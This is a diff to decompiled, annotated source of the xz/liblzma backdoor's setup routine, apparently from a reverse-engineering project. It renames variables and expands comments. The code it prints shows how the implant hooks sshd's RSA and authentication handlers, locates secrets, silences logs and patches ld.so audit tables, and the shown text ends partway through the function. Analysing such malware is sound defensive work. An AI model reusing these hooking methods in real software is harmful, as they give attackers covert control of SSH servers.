@@ -5,12 +5,7 @@
 
 
 /*
- * AutoDoc: Loader workhorse that performs every runtime retrofit. It snapshots the resolver frame/GOT, zeros a local
- * `backdoor_data_t`, parses `_r_debug` via `process_shared_libraries`, hydrates the shared globals + hooks blob from liblzma,
- * refreshes the string-reference catalogue, seeds sshd/log contexts, resolves the libcrypto/ld.so imports (including the
- * `_dl_audit*` tables), runs the sensitive-data and monitor discovery heuristics, locks down the sshlogv handlers, and streams the
- * resulting hook addresses into `secret_data`. On success it flips the audit-state bits, installs the symbind trampoline, and
- * restores the saved lzma allocator; any failure resets the ld.so ctx and lets glibc’s cpuid bookkeeping continue untouched.
+ * AutoDoc: Loader workhorse that performs every runtime retrofit. After confirming the resolver-frame/cpuid GOT distance it zeroes a stack `backdoor_data_t`, parses `_r_debug` with `main_elf_parse` + `process_shared_libraries`, snaps the active liblzma allocator, and repopulates the hooks blob/shared globals from liblzma. It refreshes sshd string references, dissects the mm_request/mm_answer ranges to locate the auth-log format, PAM flag, and PermitRootLogin toggles, runs the sensitive-data + monitor heuristics, and harvests the sshlogv handlers from `syslog_bad_level`. Once libc/libcrypto imports and the secret-data telemetry hit their expected counts it streams every hook/trampoline pointer into `secret_data`, flips the `_dl_audit` bitmasks, installs the symbind trampoline, and restores the liblzma allocator; failures reset the ld.so ctx and zero the cpuid GOT bookkeeping so glibc's resolver can keep running untouched.
  */
 
 #include "xzre_types.h"
@@ -66,12 +61,12 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   u8 *authprobe_func_end;
   Elf64_Rela *mem_address;
   int *auth_log_reloc;
-  log_handler_fn *pplVar45;
-  log_handler_fn *pplVar46;
+  log_handler_fn *main_data_base;
+  log_handler_fn *log_handler_tmp_ptr;
   long loop_idx;
-  log_handler_fn *pplVar48;
+  log_handler_fn *log_handler_slot_tmp;
   Elf64_Ehdr *string_begin;
-  log_handler_fn *addr1;
+  log_handler_fn *log_handler_slot_candidate;
   backdoor_data_t *backdoor_data_zero_cursor;
   elf_entry_ctx_t *entry_ctx_ptr;
   global_context_t *global_ctx_cursor;
@@ -86,54 +81,54 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   u8 *scan_cursor;
   sshd_monitor_func_t *authprobe_func_start;
   int auth_root_vote_count;
-  log_handler_fn *addr2;
+  log_handler_fn *log_handler_ctx_candidate;
   u8 wipe_stride;
   string_references_t string_refs;
   backdoor_shared_libraries_data_t shared_maps;
   backdoor_data_t backdoor_data;
   backdoor_hooks_data_t *hooks;
   global_context_t *global_ctx;
-  u8 *local_b48;
-  log_handler_fn *local_b20;
-  backdoor_hooks_data_t *local_b10;
-  EncodedStringId local_acc;
-  ptrdiff_t local_ac8;
-  pfn_RSA_public_decrypt_t *local_ac0;
-  pfn_EVP_PKEY_set1_RSA_t *local_ab8;
-  pfn_RSA_get0_key_t *local_ab0;
-  void *local_aa8;
-  u64 local_aa0;
+  u8 *syslog_bad_level_cursor;
+  log_handler_fn *validated_log_handler;
+  backdoor_hooks_data_t *hooks_data;
+  EncodedStringId string_id_cursor;
+  ptrdiff_t link_map_delta;
+  pfn_RSA_public_decrypt_t *rsa_public_decrypt_slot;
+  pfn_EVP_PKEY_set1_RSA_t *evp_set1_rsa_slot;
+  pfn_RSA_get0_key_t *rsa_get0_key_slot;
+  void *libc_stack_end_slot;
+  u64 liblzma_text_size;
   u64 local_a98;
   u64 local_a90;
-  main_elf_t local_a88;
-  u64 *local_a70;
-  backdoor_shared_libraries_data_t local_a68;
-  dasm_ctx_t local_a30;
-  dasm_ctx_t local_9d8;
-  backdoor_data_t local_980;
+  main_elf_t main_elf_ctx;
+  u64 *resolver_frame_snapshot;
+  backdoor_shared_libraries_data_t shared_maps_args;
+  dasm_ctx_t syslog_dasm_ctx;
+  dasm_ctx_t probe_dasm_ctx;
+  backdoor_data_t loader_data;
   
   wipe_stride = 0;
-  local_acc = 0;
-  backdoor_data_zero_cursor = &local_980;
+  string_id_cursor = 0;
+  backdoor_data_zero_cursor = &loader_data;
   // AutoDoc: Wipe the stack-resident `backdoor_data_t` so every elf handle, link_map slot, and scratch struct starts from zero.
   for (loop_idx = 0x256; loop_idx != 0; loop_idx = loop_idx + -1) {
     *(undefined4 *)&backdoor_data_zero_cursor->sshd_link_map = 0;
     backdoor_data_zero_cursor = (backdoor_data_t *)((long)&backdoor_data_zero_cursor->sshd_link_map + 4);
   }
-  elf_handles = &local_980.elf_handles;
-  local_980.elf_handles.ldso = &local_980.dynamic_linker_info;
-  local_980.elf_handles.libc = &local_980.libc_info;
-  local_ac8 = 0;
-  local_ac0 = (pfn_RSA_public_decrypt_t *)0x0;
-  local_ab8 = (pfn_EVP_PKEY_set1_RSA_t *)0x0;
-  local_ab0 = (pfn_RSA_get0_key_t *)0x0;
-  local_aa8 = (void *)0x0;
+  elf_handles = &loader_data.elf_handles;
+  loader_data.elf_handles.ldso = &loader_data.dynamic_linker_info;
+  loader_data.elf_handles.libc = &loader_data.libc_info;
+  link_map_delta = 0;
+  rsa_public_decrypt_slot = (pfn_RSA_public_decrypt_t *)0x0;
+  evp_set1_rsa_slot = (pfn_EVP_PKEY_set1_RSA_t *)0x0;
+  rsa_get0_key_slot = (pfn_RSA_get0_key_t *)0x0;
+  libc_stack_end_slot = (void *)0x0;
   entry_ctx_ptr = params->entry_ctx;
-  local_980.elf_handles.liblzma = &local_980.liblzma_info;
-  local_980.elf_handles.libcrypto = &local_980.libcrypto_info;
-  local_980.elf_handles.sshd = &local_980.main_info;
-  local_980.data_handle.runtime_data = &local_980;
-  local_980.data_handle.cached_elf_handles = elf_handles;
+  loader_data.elf_handles.liblzma = &loader_data.liblzma_info;
+  loader_data.elf_handles.libcrypto = &loader_data.libcrypto_info;
+  loader_data.elf_handles.sshd = &loader_data.main_info;
+  loader_data.data_handle.runtime_data = &loader_data;
+  loader_data.data_handle.cached_elf_handles = elf_handles;
   update_got_address(entry_ctx_ptr);
   text_segment = (entry_ctx_ptr->got_ctx).tls_got_entry;
   if (text_segment != (void *)0x0) {
@@ -150,55 +145,55 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
 LAB_00105951:
       string_id = get_string_id((char *)string_begin,(char *)0x0);
       if (string_id != STR_ELF) goto code_r0x00105962;
-      local_a88.__libc_stack_end = &local_aa8;
-      local_a70 = params->entry_ctx->resolver_frame;
-      local_a88.elf_handles = elf_handles;
-      local_a88.dynamic_linker_ehdr = string_begin;
-      probe_success = main_elf_parse(&local_a88);
+      main_elf_ctx.__libc_stack_end = &libc_stack_end_slot;
+      resolver_frame_snapshot = params->entry_ctx->resolver_frame;
+      main_elf_ctx.elf_handles = elf_handles;
+      main_elf_ctx.dynamic_linker_ehdr = string_begin;
+      probe_success = main_elf_parse(&main_elf_ctx);
       if (probe_success != FALSE) {
-        local_980.active_lzma_allocator = get_lzma_allocator();
+        loader_data.active_lzma_allocator = get_lzma_allocator();
         loop_idx = 0;
         do {
-          *(undefined1 *)((long)&local_980.saved_lzma_allocator.alloc + loop_idx) =
-               *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx);
+          *(undefined1 *)((long)&loader_data.saved_lzma_allocator.alloc + loop_idx) =
+               *(undefined1 *)((long)&(loader_data.active_lzma_allocator)->alloc + loop_idx);
           loop_idx = loop_idx + 1;
         } while (loop_idx != 0x18);
-        local_a68.rsa_public_decrypt_slot = &local_ac0;
-        local_a68.evp_set1_rsa_slot = &local_ab8;
-        local_a68.rsa_get0_key_slot = &local_ab0;
-        local_a68.hooks_data_slot = params->hook_ctx->hooks_data_slot_ptr;
-        local_a68.shared_maps = &local_980;
-        local_a68.elf_handles = elf_handles;
-        local_a68.libc_imports = &local_980.libc_imports;
+        shared_maps_args.rsa_public_decrypt_slot = &rsa_public_decrypt_slot;
+        shared_maps_args.evp_set1_rsa_slot = &evp_set1_rsa_slot;
+        shared_maps_args.rsa_get0_key_slot = &rsa_get0_key_slot;
+        shared_maps_args.hooks_data_slot = params->hook_ctx->hooks_data_slot_ptr;
+        shared_maps_args.shared_maps = &loader_data;
+        shared_maps_args.elf_handles = elf_handles;
+        shared_maps_args.libc_imports = &loader_data.libc_imports;
         // AutoDoc: Walk `_r_debug` to populate the live module handles and capture the hook entries that will later be written back into liblzma.
-        probe_success = process_shared_libraries(&local_a68);
+        probe_success = process_shared_libraries(&shared_maps_args);
         if (probe_success == FALSE) goto LAB_00105a59;
-        local_b10 = *params->hook_ctx->hooks_data_slot_ptr;
-        ctx = &local_b10->global_ctx;
-        imported_funcs = &local_b10->imported_funcs;
+        hooks_data = *params->hook_ctx->hooks_data_slot_ptr;
+        ctx = &hooks_data->global_ctx;
+        imported_funcs = &hooks_data->imported_funcs;
         global_ctx_cursor = ctx;
         for (loop_idx = 0x5a; loop_idx != 0; loop_idx = loop_idx + -1) {
           global_ctx_cursor->uses_endbr64 = FALSE;
           global_ctx_cursor = (global_context_t *)((long)global_ctx_cursor + (ulong)wipe_stride * -8 + 4);
         }
-        (local_b10->global_ctx).sshd_log_ctx = &local_b10->sshd_log_ctx;
+        (hooks_data->global_ctx).sshd_log_ctx = &hooks_data->sshd_log_ctx;
         hooks_ctx_ptr = params->hook_ctx;
-        (local_b10->global_ctx).imported_funcs = imported_funcs;
-        (local_b10->global_ctx).sshd_ctx = &local_b10->sshd_ctx;
+        (hooks_data->global_ctx).imported_funcs = imported_funcs;
+        (hooks_data->global_ctx).sshd_ctx = &hooks_data->sshd_ctx;
         hooks_data_slot = hooks_ctx_ptr->hooks_data_slot_ptr;
-        (local_b10->global_ctx).libc_imports = &local_b10->libc_imports;
+        (hooks_data->global_ctx).libc_imports = &hooks_data->libc_imports;
         hooks_data_cursor = *hooks_data_slot;
         signed_payload_size = hooks_data_cursor->signed_data_size;
-        (local_b10->global_ctx).payload_bytes_buffered = 0;
-        (local_b10->global_ctx).payload_buffer = &hooks_data_cursor->signed_data;
-        (local_b10->global_ctx).payload_buffer_size = signed_payload_size;
-        elf_find_string_references(&local_980.main_info,&local_980.sshd_string_refs);
-        local_aa0 = 0;
-        text_segment = elf_get_code_segment(local_980.elf_handles.liblzma,&local_aa0);
+        (hooks_data->global_ctx).payload_bytes_buffered = 0;
+        (hooks_data->global_ctx).payload_buffer = &hooks_data_cursor->signed_data;
+        (hooks_data->global_ctx).payload_buffer_size = signed_payload_size;
+        elf_find_string_references(&loader_data.main_info,&loader_data.sshd_string_refs);
+        liblzma_text_size = 0;
+        text_segment = elf_get_code_segment(loader_data.elf_handles.liblzma,&liblzma_text_size);
         if (text_segment != (void *)0x0) {
-          (local_b10->global_ctx).liblzma_text_start = text_segment;
-          (local_b10->global_ctx).liblzma_text_end = (void *)((long)text_segment + local_aa0);
-          hooks_data_cursor = local_b10;
+          (hooks_data->global_ctx).liblzma_text_start = text_segment;
+          (hooks_data->global_ctx).liblzma_text_end = (void *)((long)text_segment + liblzma_text_size);
+          hooks_data_cursor = hooks_data;
           for (loop_idx = 0x4e; loop_idx != 0; loop_idx = loop_idx + -1) {
             (hooks_data_cursor->ldso_ctx)._unknown1459[0] = '\0';
             (hooks_data_cursor->ldso_ctx)._unknown1459[1] = '\0';
@@ -207,187 +202,187 @@ LAB_00105951:
             hooks_data_cursor = (backdoor_hooks_data_t *)((long)hooks_data_cursor + (ulong)wipe_stride * -8 + 4);
           }
           hooks_ctx_ptr = params->hook_ctx;
-          (local_b10->ldso_ctx).imported_funcs = imported_funcs;
+          (hooks_data->ldso_ctx).imported_funcs = imported_funcs;
           rsa_get0_key_hook_ptr = hooks_ctx_ptr->rsa_get0_key_entry;
-          (local_b10->ldso_ctx).hook_RSA_public_decrypt = hooks_ctx_ptr->rsa_public_decrypt_entry;
+          (hooks_data->ldso_ctx).hook_RSA_public_decrypt = hooks_ctx_ptr->rsa_public_decrypt_entry;
           evp_set1_rsa_hook_ptr = params->shared_globals->evp_set1_rsa_hook_entry;
-          (local_b10->ldso_ctx).hook_RSA_get0_key = rsa_get0_key_hook_ptr;
-          (local_b10->ldso_ctx).hook_EVP_PKEY_set1_RSA = evp_set1_rsa_hook_ptr;
-          sshd_ctx_cursor = &local_b10->sshd_ctx;
+          (hooks_data->ldso_ctx).hook_RSA_get0_key = rsa_get0_key_hook_ptr;
+          (hooks_data->ldso_ctx).hook_EVP_PKEY_set1_RSA = evp_set1_rsa_hook_ptr;
+          sshd_ctx_cursor = &hooks_data->sshd_ctx;
           for (loop_idx = 0x38; loop_idx != 0; loop_idx = loop_idx + -1) {
             sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
             sshd_ctx_cursor = (sshd_ctx_t *)((long)sshd_ctx_cursor + (ulong)wipe_stride * -8 + 4);
           }
-          (local_b10->sshd_ctx).mm_answer_authpassword_hook =
+          (hooks_data->sshd_ctx).mm_answer_authpassword_hook =
                params->shared_globals->authpassword_hook_entry;
           keyverify_hook_entry = params->hook_ctx->mm_answer_keyverify_entry;
-          (local_b10->sshd_ctx).mm_answer_keyallowed_hook =
+          (hooks_data->sshd_ctx).mm_answer_keyallowed_hook =
                params->hook_ctx->mm_answer_keyallowed_entry;
-          (local_b10->sshd_ctx).mm_answer_keyverify_hook = keyverify_hook_entry;
-          sshd_log_ctx_ptr = &local_b10->sshd_log_ctx;
+          (hooks_data->sshd_ctx).mm_answer_keyverify_hook = keyverify_hook_entry;
+          sshd_log_ctx_ptr = &hooks_data->sshd_log_ctx;
           for (loop_idx = 0x1a; loop_idx != 0; loop_idx = loop_idx + -1) {
             sshd_log_ctx_ptr->log_squelched = FALSE;
             sshd_log_ctx_ptr = (sshd_log_ctx_t *)((long)sshd_log_ctx_ptr + (ulong)wipe_stride * -8 + 4);
           }
-          (local_b10->sshd_log_ctx).log_hook_entry = params->hook_ctx->mm_log_handler_entry;
+          (hooks_data->sshd_log_ctx).log_hook_entry = params->hook_ctx->mm_log_handler_entry;
           *params->shared_globals->global_ctx_slot = ctx;
           imported_funcs_cursor = imported_funcs;
           for (loop_idx = 0x4a; loop_idx != 0; loop_idx = loop_idx + -1) {
             *(undefined4 *)&imported_funcs_cursor->RSA_public_decrypt_orig = 0;
             imported_funcs_cursor = (imported_funcs_t *)((long)imported_funcs_cursor + (ulong)wipe_stride * -8 + 4);
           }
-          (local_b10->imported_funcs).RSA_public_decrypt_plt = local_ac0;
-          (local_b10->imported_funcs).EVP_PKEY_set1_RSA_plt = local_ab8;
-          (local_b10->imported_funcs).RSA_get0_key_plt = local_ab0;
+          (hooks_data->imported_funcs).RSA_public_decrypt_plt = rsa_public_decrypt_slot;
+          (hooks_data->imported_funcs).EVP_PKEY_set1_RSA_plt = evp_set1_rsa_slot;
+          (hooks_data->imported_funcs).RSA_get0_key_plt = rsa_get0_key_slot;
           loop_idx = 0;
           do {
-            (local_b10->sshd_log_ctx).reserved_alignment[loop_idx + -0x7c] =
-                 *(u8 *)((long)&local_980.libc_imports.resolved_imports_count + loop_idx);
+            (hooks_data->sshd_log_ctx).reserved_alignment[loop_idx + -0x7c] =
+                 *(u8 *)((long)&loader_data.libc_imports.resolved_imports_count + loop_idx);
             loop_idx = loop_idx + 1;
           } while (loop_idx != 0x70);
-          (local_b10->imported_funcs).libc = &local_b10->libc_imports;
-          (local_b10->libc_imports).__libc_stack_end = local_aa8;
+          (hooks_data->imported_funcs).libc = &hooks_data->libc_imports;
+          (hooks_data->libc_imports).__libc_stack_end = libc_stack_end_slot;
           libc_allocator = get_lzma_allocator();
-          libc_allocator->opaque = local_980.elf_handles.libc;
+          libc_allocator->opaque = loader_data.elf_handles.libc;
           malloc_usable_size_stub = (pfn_malloc_usable_size_t)lzma_alloc(0x440,libc_allocator);
-          (local_b10->libc_imports).malloc_usable_size = malloc_usable_size_stub;
+          (hooks_data->libc_imports).malloc_usable_size = malloc_usable_size_stub;
           if (malloc_usable_size_stub != (pfn_malloc_usable_size_t)0x0) {
-            (local_b10->libc_imports).resolved_imports_count =
-                 (local_b10->libc_imports).resolved_imports_count + 1;
+            (hooks_data->libc_imports).resolved_imports_count =
+                 (hooks_data->libc_imports).resolved_imports_count + 1;
           }
           // AutoDoc: Resolve `_dl_audit*` metadata plus the `link_map` displacement before patching ld.so’s audit tables.
-          probe_success = find_dl_audit_offsets(&local_980.data_handle,&local_ac8,local_b10,imported_funcs)
+          probe_success = find_dl_audit_offsets(&loader_data.data_handle,&link_map_delta,hooks_data,imported_funcs)
           ;
           if (probe_success == FALSE) goto LAB_00105a60;
           libcrypto_allocator = get_lzma_allocator();
-          libcrypto_allocator->opaque = local_980.elf_handles.libcrypto;
-          search_image = local_980.elf_handles.libcrypto;
-          if (local_980.elf_handles.libcrypto != (elf_info_t *)0x0) {
+          libcrypto_allocator->opaque = loader_data.elf_handles.libcrypto;
+          search_image = loader_data.elf_handles.libcrypto;
+          if (loader_data.elf_handles.libcrypto != (elf_info_t *)0x0) {
             search_image = (elf_info_t *)
-                      elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_get0_key,0);
+                      elf_symbol_get(loader_data.elf_handles.libcrypto,STR_RSA_get0_key,0);
             evp_md_ctx_new_alloc = (pfn_EVP_MD_CTX_new_t)lzma_alloc(0xaf8,libcrypto_allocator);
-            (local_b10->imported_funcs).EVP_MD_CTX_new = evp_md_ctx_new_alloc;
+            (hooks_data->imported_funcs).EVP_MD_CTX_new = evp_md_ctx_new_alloc;
             if (evp_md_ctx_new_alloc != (pfn_EVP_MD_CTX_new_t)0x0) {
-              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
+              resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
               *resolved_count_ptr = *resolved_count_ptr + 1;
             }
           }
-          elf_info = local_980.elf_handles.sshd;
-          local_a30.instruction = (u8 *)0x0;
-          local_9d8.instruction = (u8 *)0x0;
-          text_segment = elf_get_code_segment(local_980.elf_handles.sshd,(u64 *)&local_a30);
-          scan_cursor = local_a30.instruction + (long)text_segment;
-          data_segment = elf_get_data_segment(elf_info,(u64 *)&local_9d8,FALSE);
-          (local_b10->global_ctx).sshd_text_start = text_segment;
-          (local_b10->global_ctx).sshd_text_end = scan_cursor;
-          (local_b10->global_ctx).sshd_data_start = data_segment;
-          (local_b10->global_ctx).sshd_data_end = local_9d8.instruction + (long)data_segment;
+          elf_info = loader_data.elf_handles.sshd;
+          syslog_dasm_ctx.instruction = (u8 *)0x0;
+          probe_dasm_ctx.instruction = (u8 *)0x0;
+          text_segment = elf_get_code_segment(loader_data.elf_handles.sshd,(u64 *)&syslog_dasm_ctx);
+          scan_cursor = syslog_dasm_ctx.instruction + (long)text_segment;
+          data_segment = elf_get_data_segment(elf_info,(u64 *)&probe_dasm_ctx,FALSE);
+          (hooks_data->global_ctx).sshd_text_start = text_segment;
+          (hooks_data->global_ctx).sshd_text_end = scan_cursor;
+          (hooks_data->global_ctx).sshd_data_start = data_segment;
+          (hooks_data->global_ctx).sshd_data_end = probe_dasm_ctx.instruction + (long)data_segment;
           elf_functions_table = get_elf_functions_address();
           if (((elf_functions_table == (elf_functions_t *)0x0) ||
               (sym_resolver = elf_functions_table->elf_symbol_get_addr, sym_resolver == (elf_symbol_get_addr_fn)0x0)) ||
              (elf_functions_table->elf_parse == (elf_parse_fn)0x0)) goto LAB_00105a60;
           bn_bin2bn_symbol = (Elf64_Sym *)0x0;
-          bn_free_stub = (pfn_BN_free_t)(*sym_resolver)(local_980.elf_handles.libcrypto,STR_BN_free);
-          (local_b10->imported_funcs).BN_free = bn_free_stub;
+          bn_free_stub = (pfn_BN_free_t)(*sym_resolver)(loader_data.elf_handles.libcrypto,STR_BN_free);
+          (hooks_data->imported_funcs).BN_free = bn_free_stub;
           if (bn_free_stub != (pfn_BN_free_t)0x0) {
-            bn_bin2bn_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_bin2bn,0);
+            bn_bin2bn_symbol = elf_symbol_get(loader_data.elf_handles.libcrypto,STR_BN_bin2bn,0);
           }
-          local_acc = STR_ssh_rsa_cert_v01_openssh_com;
-          string_cursor = elf_find_string(local_980.elf_handles.sshd,&local_acc,(void *)0x0);
-          (local_b10->global_ctx).ssh_rsa_cert_alg = string_cursor;
+          string_id_cursor = STR_ssh_rsa_cert_v01_openssh_com;
+          string_cursor = elf_find_string(loader_data.elf_handles.sshd,&string_id_cursor,(void *)0x0);
+          (hooks_data->global_ctx).ssh_rsa_cert_alg = string_cursor;
           if (string_cursor == (char *)0x0) goto LAB_00105a60;
-          local_acc = STR_rsa_sha2_256;
-          string_cursor = elf_find_string(local_980.elf_handles.sshd,&local_acc,(void *)0x0);
-          (local_b10->global_ctx).rsa_sha2_256_alg = string_cursor;
+          string_id_cursor = STR_rsa_sha2_256;
+          string_cursor = elf_find_string(loader_data.elf_handles.sshd,&string_id_cursor,(void *)0x0);
+          (hooks_data->global_ctx).rsa_sha2_256_alg = string_cursor;
           if (string_cursor == (char *)0x0) goto LAB_00105a60;
           bn_dup_symbol = (Elf64_Sym *)0x0;
           bn_bn2bin_stub = (pfn_BN_bn2bin_t)
-                    elf_symbol_get_addr(local_980.elf_handles.libcrypto,STR_BN_bn2bin);
-          (local_b10->imported_funcs).BN_bn2bin = bn_bn2bin_stub;
+                    elf_symbol_get_addr(loader_data.elf_handles.libcrypto,STR_BN_bn2bin);
+          (hooks_data->imported_funcs).BN_bn2bin = bn_bn2bin_stub;
           if (bn_bn2bin_stub != (pfn_BN_bn2bin_t)0x0) {
-            bn_dup_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_dup,0);
+            bn_dup_symbol = elf_symbol_get(loader_data.elf_handles.libcrypto,STR_BN_dup,0);
             if (bn_dup_symbol != (Elf64_Sym *)0x0) {
               symbol_rva = bn_dup_symbol->st_value;
-              symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
-              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
+              symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
+              resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
               *resolved_count_ptr = *resolved_count_ptr + 1;
-              (local_b10->imported_funcs).BN_dup = (pfn_BN_dup_t)(symbol_module_ehdr->e_ident + symbol_rva);
+              (hooks_data->imported_funcs).BN_dup = (pfn_BN_dup_t)(symbol_module_ehdr->e_ident + symbol_rva);
             }
-            bn_dup_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_new,0);
-            if ((local_b10->imported_funcs).BN_free != (pfn_BN_free_t)0x0) {
-              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
+            bn_dup_symbol = elf_symbol_get(loader_data.elf_handles.libcrypto,STR_RSA_new,0);
+            if ((hooks_data->imported_funcs).BN_free != (pfn_BN_free_t)0x0) {
+              resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
               *resolved_count_ptr = *resolved_count_ptr + 1;
             }
           }
-          rsa_free_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_free,0);
-          rsa_set0_key_stub = (pfn_RSA_set0_key_t)(*sym_resolver)(local_980.elf_handles.libcrypto,STR_RSA_set0_key)
+          rsa_free_symbol = elf_symbol_get(loader_data.elf_handles.libcrypto,STR_RSA_free,0);
+          rsa_set0_key_stub = (pfn_RSA_set0_key_t)(*sym_resolver)(loader_data.elf_handles.libcrypto,STR_RSA_set0_key)
           ;
           rsa_sign_symbol = (Elf64_Sym *)0x0;
-          (local_b10->imported_funcs).RSA_set0_key = rsa_set0_key_stub;
+          (hooks_data->imported_funcs).RSA_set0_key = rsa_set0_key_stub;
           if (rsa_set0_key_stub != (pfn_RSA_set0_key_t)0x0) {
-            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
+            resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
             *resolved_count_ptr = *resolved_count_ptr + 1;
-            rsa_sign_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_sign,0);
+            rsa_sign_symbol = elf_symbol_get(loader_data.elf_handles.libcrypto,STR_RSA_sign,0);
             if (search_image != (elf_info_t *)0x0) {
               symbol_rva = search_image->load_base_vaddr;
-              symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
-              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
+              symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
+              resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
               *resolved_count_ptr = *resolved_count_ptr + 1;
-              (local_b10->imported_funcs).RSA_get0_key_resolved =
+              (hooks_data->imported_funcs).RSA_get0_key_resolved =
                    (pfn_RSA_get0_key_t)(symbol_module_ehdr->e_ident + symbol_rva);
             }
           }
-          if ((local_b10->imported_funcs).BN_bn2bin != (pfn_BN_bn2bin_t)0x0) {
-            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
+          if ((hooks_data->imported_funcs).BN_bn2bin != (pfn_BN_bn2bin_t)0x0) {
+            resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
             *resolved_count_ptr = *resolved_count_ptr + 1;
           }
           // AutoDoc: Score sshd’s sensitive-data heuristics so the payload handlers know where to read/write secrets.
           probe_success = sshd_find_sensitive_data
-                             (local_980.elf_handles.sshd,local_980.elf_handles.libcrypto,
-                              &local_980.sshd_string_refs,imported_funcs,ctx);
+                             (loader_data.elf_handles.sshd,loader_data.elf_handles.libcrypto,
+                              &loader_data.sshd_string_refs,imported_funcs,ctx);
           if (probe_success == FALSE) goto LAB_00105a60;
           if (bn_bin2bn_symbol != (Elf64_Sym *)0x0) {
             symbol_rva = bn_bin2bn_symbol->st_value;
-            symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
-            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
+            symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
+            resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
             *resolved_count_ptr = *resolved_count_ptr + 1;
-            (local_b10->imported_funcs).BN_bin2bn = (pfn_BN_bin2bn_t)(symbol_module_ehdr->e_ident + symbol_rva);
+            (hooks_data->imported_funcs).BN_bin2bn = (pfn_BN_bin2bn_t)(symbol_module_ehdr->e_ident + symbol_rva);
           }
           if (bn_dup_symbol != (Elf64_Sym *)0x0) {
             symbol_rva = bn_dup_symbol->st_value;
-            symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
-            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
+            symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
+            resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
             *resolved_count_ptr = *resolved_count_ptr + 1;
-            (local_b10->imported_funcs).RSA_new = (pfn_RSA_new_t)(symbol_module_ehdr->e_ident + symbol_rva);
+            (hooks_data->imported_funcs).RSA_new = (pfn_RSA_new_t)(symbol_module_ehdr->e_ident + symbol_rva);
           }
           if (rsa_free_symbol != (Elf64_Sym *)0x0) {
             symbol_rva = rsa_free_symbol->st_value;
-            symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
-            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
+            symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
+            resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
             *resolved_count_ptr = *resolved_count_ptr + 1;
-            (local_b10->imported_funcs).RSA_free = (pfn_RSA_free_t)(symbol_module_ehdr->e_ident + symbol_rva);
+            (hooks_data->imported_funcs).RSA_free = (pfn_RSA_free_t)(symbol_module_ehdr->e_ident + symbol_rva);
           }
           if (rsa_sign_symbol != (Elf64_Sym *)0x0) {
             symbol_rva = rsa_sign_symbol->st_value;
-            symbol_module_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
-            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
+            symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
+            resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
             *resolved_count_ptr = *resolved_count_ptr + 1;
-            (local_b10->imported_funcs).RSA_sign = (pfn_RSA_sign_t)(symbol_module_ehdr->e_ident + symbol_rva);
+            (hooks_data->imported_funcs).RSA_sign = (pfn_RSA_sign_t)(symbol_module_ehdr->e_ident + symbol_rva);
           }
-          bn_bin2bn_symbol = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptUpdate,0);
-          search_image = local_980.elf_handles.sshd;
-          sshd_ctx_cursor = (local_b10->global_ctx).sshd_ctx;
-          local_a30.instruction = (u8 *)0x0;
+          bn_bin2bn_symbol = elf_symbol_get(loader_data.elf_handles.libcrypto,STR_EVP_DecryptUpdate,0);
+          search_image = loader_data.elf_handles.sshd;
+          sshd_ctx_cursor = (hooks_data->global_ctx).sshd_ctx;
+          syslog_dasm_ctx.instruction = (u8 *)0x0;
           local_a98 = local_a98 & 0xffffffff00000000;
           sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
           sshd_ctx_cursor->have_mm_answer_authpassword = FALSE;
           sshd_ctx_cursor->have_mm_answer_keyverify = FALSE;
-          text_segment = elf_get_data_segment(local_980.elf_handles.sshd,(u64 *)&local_a30,FALSE);
-          scan_cursor = local_a30.instruction;
+          text_segment = elf_get_data_segment(loader_data.elf_handles.sshd,(u64 *)&syslog_dasm_ctx,FALSE);
+          scan_cursor = syslog_dasm_ctx.instruction;
           if ((text_segment != (void *)0x0) &&
-             (local_980.sshd_string_refs.mm_request_send.func_start != (void *)0x0)) {
-            sshd_ctx_cursor->mm_request_send_start = local_980.sshd_string_refs.mm_request_send.func_start;
-            sshd_ctx_cursor->mm_request_send_end = local_980.sshd_string_refs.mm_request_send.func_end;
